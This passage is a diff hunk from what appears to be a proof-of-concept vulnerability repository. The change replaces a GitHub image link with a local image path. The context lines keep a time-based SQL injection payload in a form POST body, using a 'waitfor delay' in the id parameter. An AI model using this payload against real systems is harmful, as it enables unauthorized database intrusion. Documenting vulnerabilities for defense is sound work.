@@ -11,4 +11,4 @@ Content-Type: application/x-www-form-urlencoded
 command=nav&id=-999'waitfor delay '0:0:3'--+&name=&openId=
 ```
 
-![image](https://github.com/wy876/POC/assets/139549762/8bb3c1c9-a38d-475a-9162-8ad5de56b03f)
+![image](../../images/8bb3c1c9-a38d-475a-9162-8ad5de56b03f.png)
